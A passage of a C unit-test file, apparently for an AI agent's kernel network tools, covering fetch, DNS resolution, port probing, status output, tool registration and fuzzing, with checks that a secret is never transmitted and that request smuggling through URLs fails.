    fake_reset();
    n += (size_t)snprintf(raw, sizeof raw, "HTTP/1.1 200 OK\r\n\r\n");
    for (int c = 0; c < 32; c++) raw[n++] = (char)c;      /* NUL..0x1F */
    raw[n++] = (char)0x7F;
    raw[n++] = (char)0xFF;
    raw[n++] = 'E'; raw[n++] = 'N'; raw[n++] = 'D';
    memcpy(fake.rx, raw, n);
    fake.rx_len = n;

    call_json("net_fetch", "{\"url\":\"http://h.example/bin\"}", &r);
    CHECK_EQ(r.is_error, 0);
    /* the tail survived, so the NUL did not end the quoting */
    CHECK_CONTAINS(res_buf, "END");
    /* and the result itself is printable */
    for (size_t i = 0; i < r.len; i++) {
        unsigned char c = (unsigned char)res_buf[i];
        CHECK(c == '\n' || c == '\t' || (c >= 0x20 && c < 0x7F));
        if (!(c == '\n' || c == '\t' || (c >= 0x20 && c < 0x7F))) break;
    }
}

static void test_fetch_save_path(void) {
    tool_result_t r;
    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nsaved body content");

    call_json("net_fetch",
              "{\"url\":\"http://h.example/doc\",\"save_path\":\"/tmp/doc\"}",
              &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "saved: 18 bytes to /tmp/doc");

    vfs_stat_t st;
    CHECK_EQ(vfs_stat("/tmp/doc", &st), VFS_OK);
    CHECK_EQ((long)st.size, 18);

    file_t *f = vfs_open("/tmp/doc", O_RDONLY);
    CHECK(f != NULL);
    if (f) {
        char got[64];
        int64_t got_n = vfs_read(f, got, sizeof got - 1);
        vfs_close(f);
        if (got_n >= 0) { got[got_n] = '\0'; CHECK_STR(got, "saved body content"); }
    }

    /* an unwritable path is reported, and does not throw the response away */
    fake_reset();
    fake_reply("HTTP/1.1 200 OK\r\n\r\nbody");
    call_json("net_fetch",
              "{\"url\":\"http://h.example/\",\"save_path\":\"/no/such/dir/x\"}",
              &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "save FAILED");
    CHECK_CONTAINS(res_buf, "body");
}

/* ====================================================================== */
/* 6. net_resolve / net_probe / net_status                                */
/* ====================================================================== */

static void test_resolve(void) {
    tool_result_t r;

    fake_reset();
    call_json("net_resolve", "{\"host\":\"example.com\"}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "example.com -> 203.0.113.7");
    CHECK_STR(fake.last_host, "example.com");

    /* a URL is accepted where a name is expected */
    fake_reset();
    call_json("net_resolve", "{\"host\":\"https://Example.com/a/b\"}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_STR(fake.last_host, "example.com");

    /* a literal needs no query at all */
    fake_reset();
    call_json("net_resolve", "{\"host\":\"192.0.2.9\"}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "192.0.2.9 -> 192.0.2.9");
    CHECK_EQ(fake.resolves, 0);

    /* failure names the cause */
    fake_reset();
    fake.resolve_rc = FETCH_EDNS;
    call_json("net_resolve", "{\"host\":\"nope.invalid\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "did not resolve");
    CHECK_CONTAINS(res_buf, "resolver may be unreachable");

    /* bad arguments */
    fake_reset();
    call_json("net_resolve", "{}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "host");
    call_json("net_resolve", "{\"host\":\"a b c\"}", &r);
    CHECK_EQ(r.is_error, 1);
    call_json("net_resolve", "{\"host\":123}", &r);
    CHECK_EQ(r.is_error, 1);
}

static void test_probe(void) {
    tool_result_t r;

    fake_reset();
    call_json("net_probe", "{\"host\":\"example.com\",\"port\":443}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "open:");
    CHECK_EQ(fake.probes, 1);
    CHECK_EQ(fake.last_port, 443);

    fake_reset();
    fake.probe_rc = FETCH_ECONNECT;
    call_json("net_probe", "{\"host\":\"example.com\",\"port\":9\"}", &r);
    CHECK_EQ(r.is_error, 1);

    fake_reset();
    fake.probe_rc = FETCH_ECONNECT;
    call_json("net_probe", "{\"host\":\"example.com\",\"port\":9}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "closed:");

    /* the port is mandatory and bounded */
    fake_reset();
    call_json("net_probe", "{\"host\":\"example.com\"}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "port");
    call_json("net_probe", "{\"host\":\"h\",\"port\":0}", &r);
    CHECK_EQ(r.is_error, 1);
    call_json("net_probe", "{\"host\":\"h\",\"port\":70000}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_EQ(fake.probes, 0);

    /* a probe sends NOTHING: that is the whole contract */
    fake_reset();
    call_json("net_probe", "{\"host\":\"example.com\",\"port\":443}", &r);
    CHECK_EQ(fake.sends, 0);
    CHECK_EQ((long)fake.tx_len, 0);
}

static void test_status(void) {
    tool_result_t r;

    fake_reset();
    call_json("net_status", "{}", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "link:    UP");
    CHECK_CONTAINS(res_buf, "10.0.2.15");
    CHECK_CONTAINS(res_buf, "10.0.2.3");
    CHECK_CONTAINS(res_buf, "api.anthropic.com");
    /* the honesty line */
    CHECK_CONTAINS(res_buf, "verification OFF");

    /* it ignores its input entirely — the most robust possible parse */
    fake_reset();
    call_json("net_status", "]]]not json at all", &r);
    CHECK_EQ(r.is_error, 0);
    CHECK_CONTAINS(res_buf, "link:");

    fake_reset();
    fake.no_nic = 1;
    call_json("net_status", "{}", &r);
    CHECK_CONTAINS(res_buf, "link:    DOWN");

    fake_reset();
    fetch_set_backend(NULL);
    call_json("net_status", "{}", &r);
    CHECK_EQ(r.is_error, 1);
    CHECK_CONTAINS(res_buf, "no network backend");
    fetch_set_backend(&FAKENET);
}

/* ====================================================================== */
/* 7. registry and trace discipline                                       */
/* ====================================================================== */

static void test_registered(void) {
    CHECK(tool_find("net_fetch")   != NULL);
    CHECK(tool_find("net_resolve") != NULL);
    CHECK(tool_find("net_probe")   != NULL);
    CHECK(tool_find("net_status")  != NULL);

    /* only the one that can write a file is marked as mutating */
    CHECK_TOOL_FLAGS("net_fetch",   TOOL_MUTATES, TOOL_MUTATES);
    CHECK_TOOL_FLAGS("net_resolve", TOOL_MUTATES, 0);
    CHECK_TOOL_FLAGS("net_probe",   TOOL_MUTATES, 0);
    CHECK_TOOL_FLAGS("net_status",  TOOL_MUTATES, 0);

    /* every schema must parse: a one-character typo silently unregisters the
     * tool, and the model then sees a syscall surface with a hole in it */
    static const char *names[] = { "net_fetch", "net_resolve", "net_probe",
                                   "net_status" };
    for (size_t i = 0; i < 4; i++) {
        const tool_t *t = tool_find(names[i]);
        if (!t) continue;
        json_value_t v;
        CHECK_EQ(json_parse(t->input_schema, strlen(t->input_schema), &v),
                 JSON_OK);
    }
}

static void test_exactly_one_trace_line_per_call(void) {
    tool_result_t r;
    static const char *calls[][2] = {
        { "net_fetch",   "{\"url\":\"http://h.example/\"}"        },
        { "net_fetch",   "{\"url\":\"nonsense\"}"                 },
        { "net_fetch",   "{}"                                     },
        { "net_resolve", "{\"host\":\"h.example\"}"               },
        { "net_resolve", "{\"host\":\"\"}"                        },
        { "net_probe",   "{\"host\":\"h.example\",\"port\":80}"   },
        { "net_probe",   "{\"host\":\"h.example\"}"               },
        { "net_status",  "{}"                                     },
    };
    for (size_t i = 0; i < sizeof calls / sizeof calls[0]; i++) {
        fake_reset();
        fake_reply("HTTP/1.1 200 OK\r\n\r\nx");
        trace_reset();
        kcap_reset();
        call_json(calls[i][0], calls[i][1], &r);
        CHECK_EQ(trace_count(), 1);
        CHECK_CONTAINS(kcap_text(), " -> ");
    }
}

/* ====================================================================== */
/* 8. fuzz                                                                */
/* ====================================================================== */

static uint32_t rng_state = 0x13579bdf;
static uint32_t rnd(void) {
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}

/* Throw structurally-random arguments at every tool. Nothing may fault, hang,
 * write outside a buffer (ASan is watching), or transmit the secret. */
static void test_fuzz(void) {
    static const char *names[] = { "net_fetch", "net_resolve", "net_probe",
                                   "net_status" };
    static const char *keys[]  = { "url", "host", "port", "method", "body",
                                   "save_path", "max_bytes", "timeout_ms",
                                   "content_type", "", "\xff\xfe" };
    char in[1024];

    trace_set_enabled(0);
    for (int iter = 0; iter < 4000; iter++) {
        fake_reset();
        fake.resolve_rc  = (rnd() & 7) ? FETCH_OK : FETCH_EDNS;
        fake.exchange_rc = (rnd() & 7) ? FETCH_OK : FETCH_ETIMEOUT;
        fake.rx_len = rnd() % 64;
        for (size_t i = 0; i < fake.rx_len; i++) fake.rx[i] = (char)rnd();

        size_t n = 0;
        in[n++] = '{';
        int members = (int)(rnd() % 4);
        for (int m = 0; m < members && n < sizeof in - 80; m++) {
            if (m) in[n++] = ',';
            n += (size_t)snprintf(in + n, sizeof in - n, "\"%s\":",
                                  keys[rnd() % (sizeof keys / sizeof keys[0])]);
            switch (rnd() % 5) {
            case 0: n += (size_t)snprintf(in + n, sizeof in - n, "%d",
                                          (int)rnd() - 1000); break;
            case 1: n += (size_t)snprintf(in + n, sizeof in - n, "null"); break;
            case 2: n += (size_t)snprintf(in + n, sizeof in - n, "[1,{\"a\":2}]");
                    break;
            case 3: n += (size_t)snprintf(in + n, sizeof in - n,
                                          "\"http%s://%s%s\"",
                                          (rnd() & 1) ? "s" : "",
                                          (rnd() & 1) ? "h.example" : "",
                                          (rnd() & 1) ? "/a?b=c" : ":99999");
                    break;
            default: {
                size_t k = rnd() % 24;
                in[n++] = '"';
                while (k-- && n < sizeof in - 8) {
                    unsigned char c = (unsigned char)(rnd() % 0x7F);
                    if (c < 0x20 || c == '"' || c == '\\') c = 'x';
                    in[n++] = (char)c;
                }
                in[n++] = '"';
                break;
            }
            }
        }
        if (n < sizeof in - 2) in[n++] = '}';

        tool_result_t r;
        /* Deliberately pass the span length, not a NUL — that is the contract
         * in tool.h, and a parser that walks off the end shows up here. */
        call_span(names[rnd() % 4], in, n, &r);
        CHECK(r.len < r.cap);
        CHECK(res_buf[r.len] == '\0');
    }
    trace_set_enabled(1);

    /* the whole point */
    CHECK_EQ(fake.leaked, 0);
}

/* Random bytes straight into the URL parser: no JSON layer, no tool layer. */
static void test_fuzz_url(void) {
    char        url[300];
    fetch_url_t u;

    for (int iter = 0; iter < 20000; iter++) {
        size_t n = rnd() % sizeof url;
        for (size_t i = 0; i < n; i++) url[i] = (char)(rnd() & 0xFF);
        const char *why = NULL;
        int rc = fetch_url_parse(url, n, &u, &why);
        CHECK(rc == FETCH_OK || rc == FETCH_EURL || rc == FETCH_ESCHEME ||
              rc == FETCH_ENOSPC || rc == FETCH_EPOLICY || rc == FETCH_EINVAL);
        if (rc == FETCH_OK) {
            /* whatever came out must be well-formed enough to build a request */
            CHECK(u.host[0] != '\0');
            CHECK(u.path[0] == '/');
            CHECK(strlen(u.host) < sizeof u.host);
            CHECK(strlen(u.path) < sizeof u.path);
            char req[8192];
            fetch_options_t o;
            memset(&o, 0, sizeof o);
            int b = fetch_build_request(req, sizeof req, &u, &o);
            CHECK(b > 0);
            /* AND IT MUST BE ONE REQUEST. If a URL could ever smuggle a CRLF
             * through, this is where it would show: a second "HTTP/1.0" or a
             * blank line before the one we wrote. */
            if (b > 0) {
                const char *end = strstr(req, "\r\n\r\n");
                CHECK(end != NULL);
                CHECK(strstr(req, "HTTP/1.0") == strstr(req, "HTTP/1.0"));
                if (end) CHECK(strstr(end + 4, "HTTP/1.") == NULL);
            }
        }
    }
}

/* Random bytes straight into the response splitter. */
static void test_fuzz_response(void) {
    static char    buf[4096];
    fetch_result_t r;

    for (int iter = 0; iter < 20000; iter++) {
        size_t n = rnd() % (sizeof buf - 1);
        for (size_t i = 0; i < n; i++) buf[i] = (char)(rnd() & 0xFF);
        /* half the time, start with something status-line shaped */
        if (n > 24 && (rnd() & 1)) memcpy(buf, "HTTP/1.1 200 OK\r\n", 17);
        buf[n] = '\0';
        memset(&r, 0, sizeof r);
        int rc = fetch_split_response(buf, n, &r);
        CHECK(rc == FETCH_OK || rc == FETCH_EPROTO);
        if (rc == FETCH_OK) {
            CHECK(r.http_status >= 100 && r.http_status <= 999);
            CHECK(r.body_len <= n);
            CHECK(strlen(r.status_line) < sizeof r.status_line);
            CHECK(strlen(r.headers) < sizeof r.headers);
            CHECK(strlen(r.location) < sizeof r.location);
        }
    }
}

/* ====================================================================== */

int main(void) {
    console_init();

    /* The same shape the kernel boots with (fs_init + the /tmp the self-test
     * makes), so net_fetch's save_path writes into a real ramfs. */
    vfs_init();
    ramfs_register();
    if (vfs_mount("/", "ramfs") != VFS_OK) { printf("mount failed\n"); return 2; }
    vfs_mkdir("/tmp");

    fetch_set_backend(&FAKENET);
    fetch_set_secret_source(fake_secret);
    fake_reset();

    RUN(test_url_good);
    RUN(test_url_hostile);
    RUN(test_url_crlf_injection);
    RUN(test_url_absurd_sizes);
    RUN(test_build_request);
    RUN(test_split_response);
    RUN(test_scan_secret);
    RUN(test_secret_never_sent);
    RUN(test_fetch_success);
    RUN(test_fetch_reports_tls_state);
    RUN(test_fetch_truncation_is_honest);
    RUN(test_fetch_failures);
    RUN(test_fetch_bad_arguments);
    RUN(test_fetch_redirect_reported_not_followed);
    RUN(test_fetch_binary_body_is_rendered_safely);
    RUN(test_fetch_save_path);
    RUN(test_resolve);
    RUN(test_probe);
    RUN(test_status);
    RUN(test_registered);
    RUN(test_exactly_one_trace_line_per_call);
    RUN(test_fuzz);
    RUN(test_fuzz_url);
    RUN(test_fuzz_response);

    /* Said once more, loudly, at the end: across every test and every fuzz
     * iteration above, not one byte of this machine's secret reached the wire. */
    CHECK_EQ(fake.leaked, 0);

    return th_report("net_tools");
}
